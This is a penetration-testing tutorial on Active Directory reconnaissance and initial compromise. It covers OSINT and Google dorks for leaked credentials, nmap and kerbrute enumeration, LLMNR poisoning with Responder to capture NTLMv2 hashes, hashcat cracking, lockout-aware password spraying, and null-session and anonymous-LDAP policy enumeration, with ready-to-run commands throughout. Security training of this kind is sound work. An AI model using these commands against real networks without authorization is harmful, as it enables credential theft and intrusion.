# Active Directory | Enumeration and Basic Attacks

In this repo we will be learning how to enumerate active directory environments and perform basic attacks.

>[!NOTE]
>To gain a high level overview of how active directory works - please see [active-directory-introduction](https://github.com/puzz00/active-directory-introduction/blob/main/active-directory-introduction.md)

## External Information Gathering

Gathering information about targets is a crucial part of any penetration test. This stage can be seen as reconnaisance - getting to understand the target organization, its employees and technology being used.

>[!NOTE]
>We will be covering information gathering techniques in more detail in other repos - hopefully one to look specifically at *web application* info gathering and another more specifically on *open source intelligence gathering* - but for now we can focus our attention on some techniques which can be of use when targetting *active directory* environments being used by our targets

Keeping in mind that information gathering is *huge* we can start to take a look at *some* specific techniques which are of use.

### What are we Looking For?

We are essentialy looking for any information which will be of use to us when we are initially compromising the domain or later looking to elevate our privileges.

Here is a list of useful information to look for:

- IP Space
    - IP netblocks being used by the target
    - Cloud hosting providers being used
    - DNS record entries
    - A valid Autonomous System Number for the target
- Domain Info
    - Who administers the domain
    - Are there any subdomains in scope
    - Can we find publicly accessible domain services such as websites or VPN portals
    - Are there any defenses such as Intrusion Prevention Systems or Intrusion Detection Systems in place
- Schema Format
    - What can we discover about email accounts, AD usernames, password policies etc
- Data Disclosures
    - Can we find leaked data in publicly available resources such as .pdf files or github repos
- Breach Data
    - Are there any credentials already leaked which are from previous breaches of the target

### Where are we Looking?

Now we know *what* we are looking for we can think about *where* we can find it.

There are lots of places we can look for the data we are interested in. Here are some examples:

- ASN / IP Registrars
    - [IANA](https://www.iana.org) and [arin](https://www.arin.net) for targets in the Americas
    - [RIPE](https://www.ripe.net) for targets in Europe
    - [BGP Toolkit](https://bgp.he.net) to gain a comprehensive understanding of the targets network infrastructure
- Domain Registrars and DNS | the following tools can give us data about domain names, IP addresses and related network resources
    - [Domaintools](https://www.domaintools.net)
    - [PTRArchive](https://ptrarchive.com)
    - [ICANN](https://lookup.icann.org/lookup)
- Social Media
    - We can find useful data regarding targets and their employees using social media such as the following
        - Facebook
        - LinkedIn
        - Twitter
        - Online News Articles
- Public Facing Company Websites
    - A great resource - lots of relevant data can be found by *crawling* and *spidering* public facing websites | *About Us* and *Contact* pages are often very useful - as are embedded documents
- Breached Data Resources
    - [HaveIBeenPwned](https://haveibeenpwned.com) | great for checking for target email accounts
    - [Dehashed](https://www.dehashed.com) | great for searching for target emails, passwords, password policies and data useful to assist our spear phishing campaigns
- Google
    - Getting good at using advanced search operators - aka google dorks - is highly recommended as they can be used to find specific data about a target

### How?

Now we know *what* we are looking for and *some* places *where* we can find it, it is worth thinking about *how* we can use the aforementioned tools to find the information we are interested in.

>[!NOTE]
>This is a huge part of penetration testing in general - we will be looking at some useful *passive* techniques here but it is by no means exhaustive - hopefully future repos will go into more detail on areas such as *Open Source INTelligence* gathering techniques

#### Finding Address Spaces

It is useful to know IP ranges which belong to the target organisation since we can then test all of the other IP addresses in the block which they own.

We can use the [BGP Toolkit](https://www.he.net/) on Hurricane Electric to find address spaces for large companies. We just type in an IP address or a domain and see what it can retrieve.

>[!NOTE]
>Smaller companies will be using third-party address spaces such as AWS or Cloudflare | it is important we keep this in mind and check what is in scope to test

#### Website Ownership

Identifying basic information about domains is important as it is useful for the following tests which we perform. Here are some ways we can gain a high-level overview and then further enumeration via DNS *passive* reconnaissance techniques.

##### Whois

Whois queries databases which contain information regarding who owns internet resources such as domain, ip addresses and ip address blocks. We can use it from the command line or via third party web-based tools.

We can use whois to find out lots of useful information at the start of a web penetration test. We can feed it a domain name or an IP address.

A simple command to use form the command line is `sudo whois tesla.com`

>[!NOTE]
>We do not need to specify the protocol as we are looking just at the domain

>[!TIP]
>If we see that an asset is coming up to the end of its registry expiry date and nobody has renewed it - it might suggest to us that the asset is not considered very valuable to its owner

We can find nameservers for the domain. Nameservers translate domain names into IP addresses - they are a key part of DNS. We might get information about proxy servers here since some providers such as cloudflare proxy web server IP addresses so if we use a tool such as `host` to try to find the IP address of a domain we will instead be given the IP address of the cloudflare proxy server.

We can use IP addresses with whois like this: `sudo whois 104.21.44.108` This will let us know who owns the IP address and / or IP block which it belongs to. If the web servers IP address is being hidden by a proxy server, we will get information relating to the proxy server.

We might find that the web server is not hiding behind a proxy server. We will get information about the target web server if this is the case. We can research the registrar and other information we find using whois.

>[!TIP]
>We can use web services such as [domain tools](https://whois.domaintools.com) to perform whois lookups - the results can be easier to read

##### Netcraft

Netcraft can be used to fingerprint websites. It can be found at [netcraft](https://www.netcraft.com/)

There is a free tool on their website called `Whats that site running?`

>[!TIP]
>Since Netcraft gives us a good high level overview of what we are up against when it comes to a target organizations web prescence - it makes sense to run it right at the start of our testing cycle along with `whois`

Netcraft returns lots of useful information. We can get to know more about technologies being used by the target website - this means we get a basic fingerprint of the website just by using netcraft.

We can also find out more about Content Management Systems which might be running on the website from the tracking cookie information. Netcraft will also show us scripting frameworks such as javascript libraries which are being used.

#### DNS

Once we have gained a high level overview of the target organizations online prescence using whois and netcraft, we can turn our attention to DNS enumeration. This allows us to build a more detailed map of the target and its infrastructure.

We can enumerate DNS to try to find hosts which we were not aware of and which we can then ask our clients about if they are not already in our testing scope.

We might find subdomains which are on IP addresses which are in scope and can therefore be tested. These might not have been given to us explicitly but since they are in scope we can test them.

We can use `dnsrecon` from the command line. A simple search can be started using: `sudo dnsrecon -d tesla.com` The IP addresses returned are useful as they widen the attack surface.

A good resource to use which is still considered a *passive* reconnaisance technique is to use [dnsdumpster](https://dnsdumpster.com) This tool also lets us see visible hosts from an attackers perspective. It shows us an excellent map of what it discovers. We can export this map.

>[!NOTE]
>We do not need to specify the protocol when we use dnsdumpster

We can use *google dorks* to look for subdomains passively using a search such as `site:*.tesla.com`

If we find lots of the same subdomain such as `www` being returned we can filter these out using `site:*.tesla.com -www` and then add filters as we find more and more subdomains for example `site:*.tesla.com -www -shop -service`

#### Google Dorks

Google dorks are advanced web searches which use search operators. We can use them to enumerate lots of useful and specific information about target websites.

We can use `site:tesla.com` to limit the results to `tesla.com` and its subdomains. We can combine these advanced search terms with regular search terms like so: `employees site:tesla.com`

We could make the search more specific using `inurl:admin` These search terms can be combined like so: `site:google.com inurl:admin` Another search operator we can use which is similar to `inurl` is `intitle:admin`

We can use *wildcards* to look for specific resources such as subdomains: `site:*.tesla.com`

We can limit results to pages which have specific types of file using `filetype:pdf`

An example of combining dorks to find *pdf* files for a specific organization we could use `filetype:pdf inurl:tezzla.com`

We can search for directory listing using: `intitle:"index of"`

If we want to try to find credentials which have been leaked for a target organization we can try the following google dorks: `inurl:auth_user_file.txt` | `intitle:"index of" "credentials"`

We can try `inurl:wp-config.bak` to search for information leakage via back up files of the wordpress configuration file.

Finding email addresses is always useful, so we could try `intext:"@tezzla.com" inurl:tezzla.com`

There are resources we can use such as [google hacking](https://pentest-tools.com/information-gathering/google-hacking) and the [google-hacking-database](https://www.exploit-db.com/google-hacking-database) which can help us.

We can also automate the process using a tool such as [dork scanner](https://github.com/madhavmehndiratta/dorkScanner)

If we want to have a look at what a website used to look like in the past we can use `cache:tesla.com` or we could visit and use the [wayback machine](https://web.archive.org/)

All in all - by using combinations of advanced search operators aka google dorks we can attempt to gather useful data passively.

It is possible to really target what we are looking for using combinations of google dorks. An example of this - not necessarily related to pen testing target organizations but provided just for interest - would be looking for government websites which have exposed .csv files due to directory listing being enabled: `site:gov.* intitle:"index of" *.csv`

#### Public Websites

Along with the websites of the target company, we can look at social media to find out more about them. We can find valuable information relating to employees and technology being used by target organizations via platforms such as Facebook, Twitter, LinkedIn, Indeed and Glassdoor.

>[!TIP]
>Job postings can reveal data such as technology being used along with versions - looking at job descriptions and person specifications can be well worth our time

It is worth our while looking at a target organizations github presence as sometimes useful data such as hardcoded credentials are leaked via pushes to public repos. The [trufflehog](https://github.com/trufflesecurity/truffleHog) tool is a good way to automate searching for leaked credentials.

##### Target Company Websites

These are great places to look for useful information.

We will often find valuable data such as email addresses, telephone numbers, documents and more.

>[!TIP]
>Checking inside embedded documents for links to *intranet* sites or other internal infrastructure can help us map the internal domain

#### Credential Hunting

Finding usernames and passwords is always of interest, so we can try to find them using a variety of tools and techniques.

One tool we can use to enumerate *linkedin* for an organization is [linkedin2username]('https://github.com/initstring/linkedin2username') This tool will generate possible usernames from data found on *linkedin* which we can use in *password spraying* attacks.

If we want to find passwords in cleartext which have previously been looted, we can use a tool such as [dehashed]('https://dehashed.com/') which might give us old passwords from previous breaches. Many of these will not work but we only need one to be valid in order for us to further our enumeration and attacks.

We can use the data from *dehashed* to assist in creating a username list for our *password spraying* attacks.

>[!TIP]
>We can use `sudo python3 dehashed.py -q tezzla.com -p` from a bash session if we have *dehashed.py* on our machine

## Initial Domain Enumeration

We are going to look at this initial enumeration of a domain from the point of view of having a connection to a linux machine on the domain along with a subnet which is in scope but no other data to work with.

>[!NOTE]
>Organizations we are testing will give us various ways to access their internal networks - the example we are working with here is a common one

We first of all want to get an idea about the network we have been attached to - we can look for:

- Hosts
- Services | e.g. Kerberos, NetBIOS, LDAP, DNS
- AD Users
- AD Joined Computers
- Potential Vulnerabilities

>[!IMPORTANT]
>We need to systematically record all our findings during this initial enumeration stage - all data is useful

In order to enumerate the domain we can use *passive* and if in scope *active* techniques.

We will begin using a *passive* technique as it is best to keep as quiet as we can on networks.

### Listening to the Network Traffic

It is a good idea to listen to network traffic passively using tools such as `tcpdump` and `wireshark`

If we have access to a GUI we can use `wireshark` directly, but this is not always the case as often we only have access to a command line interface. This makes it important to get to know how to use a tool such as *tcpdump* as it is used via the command line and does not use many resources in terms of memory and processing power.

In this example even though we have a remote desktop session and therefore access to a GUI we will begin with *tcpdump* to practise using it.

>[!TIP]
>We can *write* the output from *tcpdump* to a *.pcap* file so we can later analyze it in wireshark | possibly on our own local machine after transferring it across using ssh or ftp for example

First of all we check which *network interfaces* we have available on the remote machine on the companys internal network using `ifconfig | grep -B1 "inet 172"`

We use *172* because we are looking for interfaces on the subnet in our scope which is *172.168.5.0/23*. The first host can be found at *172.168.4.1* and the last at *172.16.5.254*

>[!NOTE]
>The -B1 option specifies to *grep* that we want it to return one line before it finds the string *inet 172* as well as the line with the string in it | this is so we can see the interface name which in this case is one line above the IPv4 address

![ad1](/images/1.png)

We next look at which interfaces are available to use *tcpdump* on using `sudo tcpdump -D`

We see that the interface we want to listen on is *ens224*

![ad2](/images/2.png)

When we run *tcpdump* we specify that we want less data returned by using the `-q` flag since we are just looking for IP addresses at the moment. We write the output to a *.pcap* file using the `-w` flag: `sudo tcpdump -i ens224 -q -w data_1.pcap`

![ad3](/images/3.png)

>[!NOTE]
>There is much more we can do with *tcpdump* | it is worth getting to know it better but here this will do to help us find IP addresses of hosts on the network

After letting *tcpdump* run for a while we can stop it and start *wireshark* from the *terminal* using `sudo -E wireshark` | we then open the *data_1.pcap* file and take a look at its stats for a high level overview of the traffic on the network.

![ad4](/images/4.png)

![ad5](/images/5.png)

When we use the *display filter* functionality in *wireshark* to filter for *arp* frames we start to see IP addresses of interest which we can note down somewhere.

>[!NOTE]
>Display filters are applied in wireshark and do not lose other types of data whereas *capture filters* are specified when wireshark starts and cause it to not capture other types of data at all

![ad6](/images/6.png)

#### Responder

Another tool we can use is *responder* | this tool has lots of functionality and we will see how we can use it to attempt to capture hashes later but for now we are going to run it passively just to check out traffic on the network.

We can use `sudo responder -I ens224 -A` and then look at the captured data for IP addresses we might not have found using *tcpdump* or *wireshark*

>[!NOTE]
>The `-A` flag runs *responder* in its *analyze* mode which means that we can see traffic but we are not poisoning anything

![ad7](/images/7.png)

![ad8](/images/8.png)

### Active Scans

Moving into the realm of *active* scanning where we interact with hosts on the network in different ways we can start by using *ICMP* requests and responses to find live hosts.

>[!IMPORTANT]
>ICMP traffic is frequently dropped so we cannot rely on it alone | we must combine ICMP scans with other methods such as listening to network traffic and half-open SYN scans with a tool such as *nmap*

The *fping* tool is a good choice for checking for hosts using *icmp*

We can use the `-a` flag to return *alive* hosts

The `-s` flag gives us some useful *stats* at the end of the scan

Using the `-g` flag *generates* a target list

The `-q` flag gives us less data as we are just looking for IP addresses at the moment

The final command is `sudo fping -asgq 172.16.5.0/23` and it shows us in this case that it can find *three* alive hosts though as mentioned earlier this needs to be treated cautiously as often *icmp* traffic is dropped so responses are not received even though there are live hosts on the network.

![ad9](/images/9.png)

#### Nmap

The *nmap* tool is awesome | even Trinity uses it whilst fighting the matrix | but because it is awesome there is a lot to learn with it.

This is one tool which is really worth learning in depth. Here we are merely scratching the surface but by doing so we are able to find useful information regarding the target domain and the hosts on it.

There are many different types of scans we can perform using *nmap* and some are more noisy than others.

The default scan is a half-open SYN scan | we call it *half-open* because a TCP *SYN* packet is sent to initiate a connection to services which might be running on ports but if a *SYN-ACK* response is received the connection is closed - no final *ACK* is sent - instead *nmap* sends a *RST* packet.

The thinking here is that this is less noisy than a full TCP connection being established and this is true but it is still going to generate noise.

We can specify the half-open syn scan using the `-sS` flag in our command.

>[!NOTE]
>In this next part of the repo we will be using various flags with our nmap commands - they are not going to be explained here since the focus is on ad enumeration and attacks but they can be researched - hopefully we will get an nmap repo up at some point

We use `sudo nmap -Pn -n -sS --min-rate=250 172.16.5.0/23` to scan for live hosts which our earlier techniques might have missed.

![ad10](/images/10.png)

Once we have a list of targets we can put them into a *.txt* file which we can feed into our *nmap* scans using the `-iL` flag.

In this example we use more aggressive scans with the `-sV` and `-A` flags.

>[!CAUTION]
>Make sure to take the time to understand the *nmap* scans you are using if pentesting an organization and check they are in scope and that the client is happy for them to be used against their networks as sometimes active vuln scans from nmap might cause instability or knock devices offline

![ad11](/images/11.png)

We use `sudo nmap -Pn -n -sV -A --min-rate=250 -iL targets.txt` to enumerate the targeted hosts more thoroughly.

![ad12](/images/12.png)

It is worth noting that generally we want to scan *all* tcp ports on a host to see if there are services listening on higher or non-default ports. We can specify all ports using `-p-`

A command which uses some bashfu with our nmap scan to return just the port numbers of open tcp ports on a host from the entire port range is:

`ports130=$(sudo nmap -n -Pn -p- --min-rate=250 -sS --open 172.16.5.130 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`

![ad13](/images/13.png)

The returned port numbers are stored in a variable - in this case `$ports130` - which we can use in further scans or put into a *.txt* file.

`sudo nmap -Pn -p$ports130 -sV -A -oA ports_130 172.16.5.130`

![ad14](/images/14.png)

>[!IMPORTANT]
>It is best to save *nmap* scan results into files so we can look back over the returned data and feed it into other tools | the `-oA` flag saves the results in several useful formats

By this point we have gained an initial understanding of the domain along with live hosts on it and potential vulnerabilities or attack paths via those hosts | the *nmap* scan results will show us versions of services and we might notice these are out of date and vulnerable to attack.

>[!NOTE]
>It might seem unlikely that we will find old versions of services or operating systems running but it does happen | some organizations continue to use out of date OS and services in their internal networks

### User Enumeration

Earlier we performed recon on external resources and hopefully created a list of possible users from employee data and perhaps old breach data. This data can be later used for attacks such as *password spraying*.

Another way we can enumerate possible usernames is by using the *kerbrute* tool which takes advantage of kerberos pre-authentication requests. It is often the case that failed attempts will not end up in logs or alerts so we can brute force potential usernames looking for valid ones.

>[!NOTE]
>We are trying to ultimately get valid creds for a domain user | even a low privileged one will allow us to further enumerate AD | so we are trying to find usernames in this stage as they can then be used in credential attacks such as *password spraying*

If we have created a possible username list from our external recon we can use this along with *kerbrute* but if not we can use a generic one such as *jsmith.txt* which can be found at [insidetrust](https://github.com/insidetrust/statistically-likely-usernames)

In order to use *kerbrute* to enumerate valid AD usernames we need to know the *Domain Controller* and the *domain* which we have discovered via our earlier initial enumeration of the domain.

In this example we found the *domain* name in the output of our *nmap* scans and the *Domain Controller* was found via *nmap* via its name and the fact that it had *port 88* open | this port is used for *kerberos* and if it is open it is a good indicator that we have found a dc

`sudo kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.168.5.5 jsmith.txt -o ad_users`

![ad15](/images/15.png)

We now have lots of valid usernames for the domain which we can use later in further attacks.

For an example ctf box in which we use *kerbrute* please see our writeup of [vulnnet:roasted](https://github.com/puzz00/vuln-net-roasted-thm/blob/main/vuln-net-roasted-thm.md)

## Gaining a Foothold in the Domain

We now have completed our initial enumeration of the domain. Our next step is to attempt to gain a foothold in it as this will let use further enumerate it and deepen our compromise of it.

Essentialy, we are attempting to gain cleartext credentials of a domain user - even a low privileged user account will be sufficient at this point.

In this section we will cover two common ways of achieving this foothold - poisoning network traffic with a *man-in-the-middle* attack and *password spraying*.

### Link Local Multicast Name Resolution Poisoning

Before we look at the specific commands involved in carrying out an LLMNR poisoning attack, it is worth our while to take the time to understand how it works at a high-level and why we carry it out.

#### Why?

The *why* is easy - we are attempting to capture NTLMv2 hashes so we can crack them offline and therefore obtain valid credentials for a domain user *or* pass them to other devices so we can impersonate the user we have captured the hash of. In this section we will focus on capturing the hashes in order to crack them and obtain cleartext credentials.

#### How?

Let us know consider *how* this attack works.

>[!IMPORTANT]
>Before continuing it makes sense to be familiar with how NT LAN Manager - NTLM - authentication works | this is covered in our [active-directory-introduction](https://github.com/puzz00/active-directory-introduction/blob/main/active-directory-introduction.md#nt-lan-manager) repo

Link Local Multicast Name Resolution is a protocol which enables name resolution to take place on a local network if Domain Name Services do not work or are not used.

A device can send a broadcast (multicast) message to all the other devices on a subnet by using the broadcast address if DNS has failed.

An example of this would be a user typing in `\\FileServer\Documents\account.docx` when they are trying to access a shared resource which is really named `\\FileServer\Documents\accounts.docx`

DNS will fail to resolve this request so by default windows will fall back on LLMNR to attempt to resolve it.

In our example, once DNS has failed, the host will send a multicast message to all the other devices which are on the same local network - link - as it. This message essentialy asks the other devices if they know where to find `\\FileServer\Documents\account.docx`

This is where our attack comes in!

As an attacker on the same local network as the victim host, we can listen for these messages and *respond* to them with a lie - we pretend that we are hosting the resource `\\FileServer\Documents\account.docx`

At this point, we enter the NTLM authentication process and we - the attacker - are pretending to be the legitimate server. This is where we send a challenge including a nonce to the victim. As per normal NTLM authentication the victim then responds to this challenge by sending us an *authenticate* message which of course includes the username, domain name and most importantly for our attack their response to our challenge which is nothing less than an encrypted value which has been created using the nonce and *the users NTLM hash*!

>[!NOTE]
>The NTLM hash might be NTLMv1 but this is unlikely since it is not considered cryptographically secure so most of the time it will be NTLMv2

At this point we have captured a domain users NTLMv2 hash and can proceed to the offline cracking part of the attack.

##### Responder

The *responder* tool we used earlier to sniff network traffic to passively enumerate the domain can be used to perform an LLMNR poisoning attack.

Pentesting distros such as kali and parrot have *responder* built-in. Before using it, we need to check out which network interface we want to run it with by using the `ifconfig` command.

We can run an llmnr poisoning attack using `sudo responder -I eth0` where the `-I` flag lets us specify the interface we want it to listen on.

![ad16](/images/16.png)

There are a number of other flags which can be used but we will not be going into these much at this point since the basic command is sufficient to get *responder* listening to network traffic and responding to events in order to force victim machines to send across their *NTLM* hashes.

With that being said, two common flags are `-w` which starts a *WPAD* rogue server and `-f` which gets *responder* to try to *fingerprint* the victim hosts os and version.

>[!TIP]
>The `-w` flag can be useful as it captures *HTTP* requests sents by users running *IE* if it has *Auto Detect Settings* enabled

Assuming our *responder* captures an ntlm hash we will see it displayed in our terminal window. The hash will be saved to a file for each host - these logs can be found at `/usr/share/responder/logs` and they take the format of `MODULE NAME - HASH TYPE - CLIENT IP.txt`

>[!NOTE]
>Each *NTLMv2* hash captured will be different even if they are for the same user on the same machine since a *timestamp* is included in the hash

![ad17](/images/17.png)

Since we are trying to gain cleartext credentials for a domain user at this point, we can let responder run for quite some time whilst we are working on other tasks.

>[!TIP]
>Setting up a responder when we first begin testing an internal network is a good idea | this can be done early in the morning and or during lunch as there will be lots of traffic when users log on to the network

###### Hash Cracking

Once we have harvested some ntlm hashes it is time to attempt to crack them offline. We can use *hashcat* to do this along with either a custom wordlist generated for the specific organization we are targeting or a good generic one.

We will need to use the *hashcat mode* of *5600* for cracking *NTLMv2* hashes which are the most common hash type to capture using this attack.

>[!CAUTION]
>*NTLMv2* hashes are *slow* to crack | be prepared for a long wait even if using a GPU based cracking rig | it can be practically impossible to crack them if strong passwords are used but we can generally rely on people being people and coming up with weak ones so it is worth giving it a go

The basic syntax for running a cracking attempt on ntlmv2 hashes saved into one file called `hashes.txt` and using the `rockyou.txt` wordlist is as follows: `sudo hashcat -a 0 -m 5600 hashes.txt rockyou.txt -O`

![ad18](/images/18.png)

![ad19](/images/19.png)

![ad20](/images/20.png)

>[!IMPORTANT]
>The `-a 0` option specifies that we want to use a basic *dictionary attack* as the *attack mode* and the `-O` flag *optimizes* the kernel for cracking which makes the attack much faster | please be aware that the `-O` flag is a good choice if we know or believe the passwords to be less than 31 characters but will miss things if they are greater than this because *hashcat* will limit the password length to 31 characters

If we successfully crack even *one* hash we can use it to gain a foothold in the domain and this will enable us to deepen own compromise of it even all the way up to full pwnership - when hacking active directory environments it really is a case of a small key opening a big door :smiley: 

### Password Spraying

Password spraying is a technique we can use to gain initial access to an Active Directory (AD) environment by attempting to authenticate with commonly used passwords across many accounts. Unlike brute force attacks that try many passwords against a single account (often leading to account lockouts), password spraying involves using a limited set of weak or default passwords (e.g., "Password123", "Welcome1") across multiple accounts in a domain, reducing the risk of detection and account lockouts.

We can try common weak passwords or create a custom list of possible passwords for the target organization.

#### Why It’s Important

Active Directory environments often contain hundreds or thousands of user accounts, and the likelihood that at least one user is using a weak or commonly used password is high. By exploiting this, we can gain access to valid user credentials, which may lead to privilege escalation or lateral movement within the network. Password spraying is particularly effective in organizations where users may not follow strong password policies.

#### Considerations When Using Password Spraying

1. **Avoiding Account Lockouts**: Most AD environments have account lockout policies that disable accounts after a certain number of failed login attempts. To avoid triggering these policies, we must limit the number of password attempts per account. For example, only one password attempt per account every few hours, depending on the domain's lockout policy, helps prevent raising suspicion.

Here is a table that visualizes a password spraying attack across three usernames and three different commonly used weak passwords. The attacks are conducted in cycles, where each password is tried once against each username, followed by a delay to avoid triggering account lockouts. 

| **Attack** | **Username**  | **Password**  |
|------------|---------------|---------------|
| **1**      | user1         | Password123   |
| **1**      | user2         | Password123   |
| **1**      | user3         | Password123   |
| **--- (Delay between cycles) ---** |               |               |
| **2**      | user1         | Welcome1      |
| **2**      | user2         | Welcome1      |
| **2**      | user3         | Welcome1      |
| **--- (Delay between cycles) ---** |               |               |
| **3**      | user1         | Summer2023    |
| **3**      | user2         | Summer2023    |
| **3**      | user3         | Summer2023    |

##### Explanation

**Attack 1**: The same password (`Password123`) is tested on all three usernames.
**Attack 2**: After a delay to avoid lockouts, a new weak password (`Welcome1`) is tried against the same usernames.
**Attack 3**: Another delay is introduced before trying the third password (`Summer2023`).

This approach avoids account lockouts by ensuring that no account is repeatedly attacked with multiple passwords in a short time frame, which could trigger security mechanisms. Instead, a delay is introduced between attack cycles to minimize detection risk.
   
2. **Password Policy Enumeration**: Before conducting password spraying, it is critical to enumerate and understand the target’s password policies (e.g., account lockout thresholds, password complexity requirements). This information can be retrieved using tools like `ldapsearch` or `rpcclient`, or through manual methods by querying AD for policy details.

>[!NOTE]
>We will look more closely at enumerating password policies in our next section | Enumerating the Domain Password Policy

3. **Username Enumeration**: A key prerequisite for password spraying is generating a valid list of usernames. These can be gathered through various means, including open-source intelligence (OSINT), LDAP queries, or sniffing traffic on the network. Accurate and thorough username lists improve the likelihood of a successful spray.

>[!NOTE]
>We will go into more depth on how to create target username lists in the Making a Target User List section

4. **Monitoring Detection**: Password spraying can trigger alerts if network monitoring or logging solutions like SIEM (Security Information and Event Management) tools are in place. To remain stealthy, we can stagger our attempts over longer periods, use low-velocity spraying methods, and monitor failed attempts closely to ensure we do not exceed the lockout threshold.

By using password spraying responsibly and understanding the environment’s security controls, we can increase our chances of a successful foothold without immediately being detected.

### Enumerating the Domain Password Policy

Understanding the domain’s password policy is critical in planning a password spraying attack. The password policy defines parameters such as minimum password length, complexity requirements, and account lockout thresholds, which directly influence how password spraying should be conducted.

This section will show us different methods for enumerating the domain password policy, both from *authenticated* and *unauthenticated* perspectives, across different platforms - linux and windows.

---

#### 1. **Enumerating Password Policy Remotely with Credentials**
When we have valid credentials, we can use tools like `crackmapexec` or `rpcclient` to remotely query the password policy of the domain.

##### **Using CrackMapExec**
`CrackMapExec` (CME) is a versatile tool that can be used to query Active Directory information, including password policies.

```bash
sudo crackmapexec smb <target_IP> -u <username> -p <password> --pass-pol
```
- `-u`: Specifies the username.
- `-p`: Specifies the password.
- `--pass-pol`: Retrieves the domain password policy.

Example:
```bash
sudo crackmapexec smb 192.168.1.100 -u admin -p password123 --pass-pol
```
Output example:
```
Password Policy:
  - Minimum Password Length: 8
  - Lockout Threshold: 5 attempts
  - Lockout Duration: 30 minutes
```

##### **Using rpcclient**
`rpcclient` is part of the `samba` suite and allows querying remote systems using MSRPC.

```bash
sudo rpcclient -U "<username>%<password>" <target_IP> -c 'getdompwinfo'
```
Example:
```bash
sudo rpcclient -U "admin%password123" 192.168.1.100 -c 'getdompwinfo'
```
Output:
```
Minimum password length: 8
Password history length: 24
Password complexity: on
Lockout threshold: 5 attempts
```

---

#### 2. **Enumerating Password Policy without Credentials via SMB Null Session**

In environments where credentials are unavailable, we can try using smb null session attacks to retrieve the password policy using tools like `rpcclient`, `enum4linux`, and `enum4linux-ng`.

>[!NOTE]
>An SMB null session attack leverages the ability to connect to a Windows system's SMB service (Server Message Block) *without providing credentials* | In certain configurations, Windows allows *unauthenticated* users to establish a *null session* granting limited access to shared resources and certain information, such as the *domain password policy*, user lists, and other system details | We can exploit this weakness to enumerate valuable domain information without needing valid credentials

##### **Using rpcclient (Null Session)**
A null session can be established by omitting the username and password in `rpcclient`.

>[!NOTE]
>The `-N` flag specifies that there is to be *no* password used

```bash
sudo rpcclient -U "" <target_IP> -N -c 'getdompwinfo'
```
Example:
```bash
sudo rpcclient -U "" 192.168.1.100 -N -c 'getdompwinfo'
```

We can also connect to a null session using `rpcclient` and then issue the `getdompwinfo` command from inside it.

![ad25](/images/25.png)

##### **Using enum4linux**
`enum4linux` is a tool that can enumerate information from SMB servers, including password policies, via null sessions.

```bash
sudo enum4linux -P <target_IP>
```

```
Password Info for Domain <DOMAIN>
  Minimum password length: 8
  Lockout threshold: 5 attempts
  Lockout duration: 30 minutes
```

>[!NOTE]
>The `-P` flag specifies that we want the domain password policy

![ad26](/images/26.png)

![ad27](/images/27.png)

##### **Using enum4linux-ng**
`enum4linux-ng` is a modern re-implementation of `enum4linux`, providing a cleaner interface and the ability to output the data to useful formats such as `json` and `yaml`.

```bash
sudo enum4linux-ng -P <target_IP> -oA pPolicy
```

![ad28](/images/28.png)

![ad29](/images/29.png)

##### **Using crackmapexed**
As well as using credentials with `crackmapexec` we can try it with a null session if they are allowed.

```bash
sudo crackmapexec smb <target_IP> -u "" --pass-pol
```

![ad30](/images/30.png)

##### **Using Null Session on a Windows Attack Machine**
From a Windows machine, we can establish a null session using the `net use` command and then enumerate the password policy using `rpcclient`.

```batch
net use \\<target_IP>\IPC$ "" /user:""
rpcclient -U "" <target_IP> -N -c 'getdompwinfo'
```

---

#### 3. **Enumerating Password Policy via LDAP Anonymous Bind**

Some AD environments allow anonymous LDAP queries, which can be used to retrieve domain password policies.

>[!TIP]
>Please see our [introduction to active directory](https://github.com/puzz00/active-directory-introduction/blob/main/active-directory-introduction.md#lightweight-directory-access-protocol) repo for a brief overview of LDAP

##### **Enumerating ldap**
We will need to know if *anonymous* binds to ldap are allowed - this can be done via an nmap *script* called *ldap-rootdse* which will give us useful data if ldap anonymous binds are allowed.

In this data we will hopefully see the *base distinguished name* which is needed when attempting to enumerate the domain password policy via an ldap anonymous bind with `ldapsearch`

>[!NOTE]
>The **Base Distinguished Name (Base DN)** is a starting point in the directory structure of an LDAP (Lightweight Directory Access Protocol) server from which the search operation begins - it represents the root of the LDAP directory tree and is essential for targeting the correct domain during enumeration.

>[!IMPORTANT]
>When using tools like `ldapsearch` to query a domain's password policy - the Base DN specifies the domain’s structure | For example if your domain is `example.com` the Base DN would be `DC=example,DC=com` | This ensures the search is conducted within the correct part of the Active Directory hierarchy

The `nmap` command to use is `sudo nmap -Pn -n -p389,636 --script ldap-rootsde <TARGET-IP>`

![ad22](/images/22.png)

We can actually find the base DN using `ldapsearch` if anonymous ldap binds are allowed.

`sudo ldapsearch -x -h <TARGET-IP> -s base -b "" namingContexts`

Here is an explanation of each part of the command:

- **`ldapsearch`**: This is the command-line tool used to query LDAP (Lightweight Directory Access Protocol) servers. It allows you to search and retrieve information from a directory.

- **`-x`**: This flag tells `ldapsearch` to use **simple authentication** (as opposed to SASL, a more complex and secure authentication mechanism). In most cases, this is used for unauthenticated or basic LDAP queries.

- **`-h <TARGET-IP>`**: Specifies the **hostname** or **IP address** of the target LDAP server. Replace `<TARGET-IP>` with the actual IP of the server we are querying.

- **`-s base`**: Defines the **scope** of the search as "base." This means that the search will be limited to the base object itself (i.e., it won't search recursively through subdirectories). This scope is useful when retrieving specific attributes of the root entry.

- **`-b ""`**: Specifies the **Base DN (Distinguished Name)** as an empty string. When the Base DN is empty, the query is directed at the **rootDSE** (Root Directory Service Entry), which provides information about the LDAP server’s configuration and capabilities without needing credentials.

- **`namingContexts`**: This is the **attribute** we are querying. The `namingContexts` attribute contains the list of base DNs available on the LDAP server. These are the different directory partitions, such as the domain's directory or configuration partitions.

###### Summary
This command queries the root of the LDAP directory on the target IP for the `namingContexts` attribute, which provides a list of directory partitions (base DNs). This information is essential for knowing where to start other LDAP searches, such as retrieving the domain's password policy.

![ad23](/images/23.png)

##### **Using ldapsearch**
`ldapsearch` can be used to query LDAP servers for password policy information if anonymous binds are allowed.

```bash
sudo ldapsearch -x -h 192.168.1.100 -b "DC=EXAMPLE,DC=COM" -s sub "(objectClass=domain)" | grep -i -E "pwd|lockout"
```

Here’s an explanation of the command:

- **`sudo`**: Runs the command with elevated privileges, which may be required to execute `ldapsearch` depending on the system's permissions.

- **`ldapsearch`**: The command-line tool used to query LDAP (Lightweight Directory Access Protocol) directories.

